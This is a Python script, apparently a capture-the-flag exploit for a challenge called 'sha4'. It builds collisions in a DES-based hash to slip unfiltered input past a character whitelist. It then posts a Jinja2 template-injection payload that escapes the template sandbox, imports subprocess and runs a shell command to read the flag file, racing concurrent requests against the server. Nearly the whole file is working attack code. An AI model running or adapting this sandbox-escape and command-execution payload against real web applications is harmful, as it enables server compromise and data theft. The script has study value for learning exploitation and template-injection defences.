import string    
import sys
from Crypto.Cipher import DES
import struct
import string
from pyasn1.codec.ber.encoder import encode
from pyasn1.codec.ber.decoder import decode
from requests import post
from re import search

def seven_to_eight(x):
  [val] = struct.unpack("Q", x+"\x00")
  out = 0
  mask = 0b1111111

  # print('  '.join([x for x in chunks("{0:b}".format(val).zfill(64), 8)]))
  # print('-'*78)
  for shift in xrange(8):
    out |= (val & (mask<<(7*shift)))<<shift
    # print('  '.join([x for x in chunks("{0:b}".format(out).zfill(64), 8)]))
  # print
  return struct.pack("Q", out)


def unpad(x):
  #split up into 7 byte chunks
  length = struct.pack("Q", len(x))
  sevens = [x[i:i+7].ljust(7, "\x00") for i in xrange(0,len(x),7)]
  sevens.append(length[:7])
  return map(seven_to_eight, sevens)


def hash(x):
  h0 = "SHA4_IS_"
  h1 = "DA_BEST!"
  keys = unpad(x)
  for key in keys:
    h0 = DES.new(key).encrypt(h0)
    h1 = DES.new(key).encrypt(h1)

  # print(' '.join([x.encode("hex") for x in keys]))
  return h0+h1


def chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]

swaps_ =    ["x      x"," x      ","  x     ","   x    ","    x   ","     x  ","      x "]
swaps_tmp = ["       x"," x      ","  x     ","   x    ","    x   ","     x  ","      x "]
swaps = []
whitelist = string.ascii_letters + string.digits + " ,.:()?!-_+=[]\t<>"


for i in swaps_tmp:
	swaps.append(7 - i.index("x"))


def bitFlip(i, bit):
	b = i & pow(2, bit) >> bit #get bit in bit'th position (76543210)

	if b == 0:
		r = i | (1 << bit)
	elif b == 1:
		r = i ^ (1 << bit)

	return r


def sanitizeLetter(letter, i):
	if letter in whitelist:
		return letter

	if chr(bitFlip(ord(letter), swaps[i%7])) in whitelist:
		return chr(bitFlip(ord(letter), swaps[i%7]))
	else:
		return ""

def sanitize(hack):

	i = 4


	sanitized = ""
	original = ""


	left = hack

	while left:
		c = left[0]

		# print(sanitized)

		if c in whitelist:
			sanitized += c
			original += c
			left = left[1:]
			i += 1
		else:
			r = left[1]

			if len(sanitizeLetter(c, i)+sanitizeLetter(r, i+1)) != 2:
				sanitized += " "
				original += " "
				i += 1
			else:

				sanitized += sanitizeLetter(c, i) + sanitizeLetter(r, i+1)

				original += c+r
				i += 2
				left = left[2:]

	return (original, sanitized)


def assrt(a, b):


	encoded = a
	encoded.replace("\n","\r")
	ber_a = encoded.decode("hex")
	out_text_a = str(decode(ber_a))


	encoded = b
	encoded.replace("\n","\r")
	ber_b = encoded.decode("hex")
	out_text_b = str(decode(ber_b))




	for i in out_text_b:
		if i not in whitelist+"'":
			print(out_text_b)
			print(repr(i))
			assert 1==2


	# print(ber_a)
	# print(ber_b)

	assert hash(ber_a) == hash(ber_b)
	

payload = """
{{3*3*3*3}}
{% set loadedClasses = " ".__class__.__mro__[2].__subclasses__() %}
{% for loadedClass in loadedClasses %} {% if loadedClass.__name__ == "catch_warnings".strip() %}
	{% set builtinsReference = loadedClass()._module.__builtins__ %}
	{% set os = builtinsReference["__import__".strip()]("subprocess".strip()) %}
		{{ os.check_output("cat sha4/flag_bilaabluagbiluariglublaireugrpoop".strip(), shell=True) }}
	{% endif %}
{% endfor %} """ + "PADDING" * 1000




# payload = """
# {{3*3*3*3}}
# """ + "PADDING" * 10000



# payload = """
# {{3*3*3*3}}
# """+"0'*10000


payload = payload.replace("\n", "")
payload = payload.replace("	", "")

original, sanitized = sanitize(payload)

from pyasn1.type import char
from pyasn1.type import univ



original_asn = encode(char.PrintableString(original)).encode("hex")
sanitized_asn = encode(char.PrintableString(sanitized)).encode("hex")



assrt(original_asn, sanitized_asn)

# print(original_asn)
# print(sanitized_asn)



import grequests
url = "http://sha4.chal.pwning.xxx/comments"


original_data = {"comment":original_asn}
sanitized_data = {"comment":sanitized_asn}

req = []

for i in range(5):

	req.append(grequests.post(url=url, data=sanitized_data))
	req.append(grequests.post(url=url, data=original_data))

z = grequests.map(req)
print(z)


for i in z:
	if '81' in i.text:
		print(i.text)
